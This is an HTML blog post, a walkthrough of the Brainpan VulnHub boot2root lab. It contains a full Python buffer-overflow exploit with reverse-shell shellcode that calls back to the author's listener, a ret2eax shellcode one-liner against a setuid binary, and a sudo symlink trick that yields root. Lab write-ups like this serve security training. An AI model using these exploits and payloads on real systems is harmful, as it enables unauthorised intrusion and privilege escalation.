@@ -1,0 +1,692 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>solving brainpan - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating) twists and turns. This boot2root is &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Solving Brainpan</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-03T00:09:43-06:00" pubdate data-updated="true">Apr 3<span>rd</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nmap -sS -A -p- -T5 192.168.1.110
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.25 ( http://nmap.org ) at 2013-03-27 22:06 CDT
+</span><span class='line'>Nmap scan report for brainpan (192.168.1.110)
+</span><span class='line'>Host is up (0.00040s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>9999/tcp  open  abyss?
+</span><span class='line'>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
+</span><span class='line'>| ndmp-version: 
+</span><span class='line'>|_  ERROR: Failed to get host information from server</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nc 192.168.1.110 9999
+</span><span class='line'>_|                            _|                                        
+</span><span class='line'>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+</span><span class='line'>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class='line'>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class='line'>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+</span><span class='line'>                                            _|                          
+</span><span class='line'>                                            _|
+</span><span class='line'>
+</span><span class='line'>[________________________ WELCOME TO BRAINPAN _________________________]
+</span><span class='line'>                          ENTER THE PASSWORD                              
+</span><span class='line'>
+</span><span class='line'>                          &gt;&gt; whoareyou
+</span><span class='line'>                          ACCESS DENIED
+</span><span class='line'>root@127:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg"></p>
+
+<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg"></p>
+
+<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg"></p>
+
+<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>
+
+<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>
+
+<p><img class="center" src="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg"></p>
+
+<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>
+
+<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>
+
+<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
+</span><span class='line'>
+</span><span class='line'># msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c
+</span><span class='line'>#[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)
+</span><span class='line'>
+</span><span class='line'>shell = "\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1"\
+</span><span class='line'>        "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
+</span><span class='line'>        "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
+</span><span class='line'>        "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
+</span><span class='line'>        "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
+</span><span class='line'>        "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
+</span><span class='line'>        "\xce\x51\x36\x57\x90";
+</span><span class='line'>
+</span><span class='line'>try:
+</span><span class='line'>    payload = '\x41' * 520        #junk
+</span><span class='line'>    payload += '\x90'*4           #ebp
+</span><span class='line'>    payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
+</span><span class='line'>    payload += '\x90'*50          #nop sled
+</span><span class='line'>    payload += shell              #shellcode
+</span><span class='line'>
+</span><span class='line'>    s = socket.socket()
+</span><span class='line'>    s.connect(('192.168.1.110', 9999))
+</span><span class='line'>    s.recv(1024)
+</span><span class='line'>    s.send(payload)
+</span><span class='line'>except Exception, e: print e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami  
+</span><span class='line'>puck
+</span><span class='line'>$ uname -a
+</span><span class='line'>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
+</span><span class='line'>$ id
+</span><span class='line'>uid=1002(puck) gid=1002(puck) groups=1002(puck)
+</span><span class='line'>$ ls /home/
+</span><span class='line'>anansi
+</span><span class='line'>puck
+</span><span class='line'>reynard</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To ease my curiousity about the ELF/EXE web server running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/puck/checksrv.sh
+</span><span class='line'>#!/bin/bash
+</span><span class='line'># run brainpan.exe if it stops
+</span><span class='line'>lsof -i:9999
+</span><span class='line'>if [[ $? -eq 1 ]]; then 
+</span><span class='line'>    pid=`ps aux | grep brainpan.exe | grep -v grep`
+</span><span class='line'>    if [[ ! -z $pid ]]; then
+</span><span class='line'>        kill -9 $pid
+</span><span class='line'>        killall wineserver
+</span><span class='line'>        killall winedevice.exe
+</span><span class='line'>    fi
+</span><span class='line'>    /usr/bin/wine /home/puck/web/bin/brainpan.exe &
+</span><span class='line'>fi 
+</span><span class='line'>
+</span><span class='line'># run SimpleHTTPServer if it stops
+</span><span class='line'>lsof -i:10000
+</span><span class='line'>if [[ $? -eq 1 ]]; then 
+</span><span class='line'>    pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
+</span><span class='line'>    if [[ ! -z $pid ]]; then
+</span><span class='line'>        kill -9 $pid
+</span><span class='line'>    fi
+</span><span class='line'>    cd /home/puck/web
+</span><span class='line'>    /usr/bin/python -m SimpleHTTPServer 10000
+</span><span class='line'>fi </span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ which gcc
+</span><span class='line'>$ which cc
+</span><span class='line'>$ which gdb
+</span><span class='line'>$ which objdump</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
+</span><span class='line'>$ cat setuid
+</span><span class='line'>-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
+</span><span class='line'>-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
+</span><span class='line'>-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
+</span><span class='line'>-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
+</span><span class='line'>-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
+</span><span class='line'>-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
+</span><span class='line'>-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
+</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
+</span><span class='line'>-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
+</span><span class='line'>-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
+</span><span class='line'>-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
+</span><span class='line'>-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
+</span><span class='line'>-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
+</span><span class='line'>-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
+</span><span class='line'>-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
+</span><span class='line'>-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
+</span><span class='line'>-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
+</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
+</span><span class='line'>-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
+</span><span class='line'>-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
+</span><span class='line'>-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
+</span><span class='line'>-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
+</span><span class='line'>-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
+</span><span class='line'>-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
+</span><span class='line'>-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
+</span><span class='line'>-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
+</span><span class='line'>-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
+</span><span class='line'>-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
+</span><span class='line'>**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
+</span><span class='line'>-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span class='line'>-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
+</span><span class='line'>-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
+</span><span class='line'>-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
+</span><span class='line'>-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>
+
+<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
+</span><span class='line'> 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
+</span><span class='line'> 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
+</span><span class='line'> 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
+</span><span class='line'> 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
+</span><span class='line'> 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
+</span><span class='line'> 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
+</span><span class='line'> 80484af:    ff d0                    call   eax
+</span><span class='line'> 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
+</span><span class='line'> 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
+</span><span class='line'> 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
+</span><span class='line'> 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
+</span><span class='line'> 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
+</span><span class='line'> 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
+</span><span class='line'> 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
+</span><span class='line'> 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
+</span><span class='line'> 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
+</span><span class='line'> 804862b:    ff d0                    call   eax
+</span><span class='line'> 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
+</span><span class='line'> 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
+</span><span class='line'>root@bt:~/brainpan# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/brainpan# gdb ./validate
+</span><span class='line'>Reading symbols from /root/brainpan/validate...done.
+</span><span class='line'>(gdb) r $(perl -e 'print "\x41"x120')
+</span><span class='line'>Starting program: /root/brainpan/validate $(perl -e 'print "\x41"x120')
+</span><span class='line'>warning: the debug information found in "/lib/ld-2.11.1.so" does not match "/lib/ld-linux.so.2" (CRC mismatch).
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x41414141 in ?? ()
+</span><span class='line'>(gdb) x/x $eax
+</span><span class='line'>0xffffd3e8:    0x41414141
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
+</span><span class='line'>$ whoami
+</span><span class='line'>anansi</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>
+
+<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd && ls -lh
+</span><span class='line'>/home/anansi/bin
+</span><span class='line'>total 8.0K
+</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
+</span><span class='line'>$ ./anansi_util
+</span><span class='line'>Usage: ./anansi_util [action]
+</span><span class='line'>Where [action] is one of:
+</span><span class='line'>  - network
+</span><span class='line'>  - proclist
+</span><span class='line'>  - manual [command]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
+</span><span class='line'>Matching Defaults entries for puck on this host:
+</span><span class='line'>    env_reset, mail_badpass,
+</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span class='line'>
+</span><span class='line'>User puck may run the following commands on this host:
+</span><span class='line'>    (root) NOPASSWD: /home/anansi/bin/anansi_util</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ mv anansi_util anansi_util_bkp
+</span><span class='line'>$ ln -s /bin/sh ./anansi_util
+</span><span class='line'>$ ls -lh
+</span><span class='line'>total 8.0K
+</span><span class='line'>lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
+</span><span class='line'>-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
+</span><span class='line'>$ sudo ./anansi_util
+</span><span class='line'>$ whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-03T00:09:43-06:00" pubdate data-updated="true">Apr 3<span>rd</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>, <a class='category' href='/blog/categories/walkthrough/'>walkthrough</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
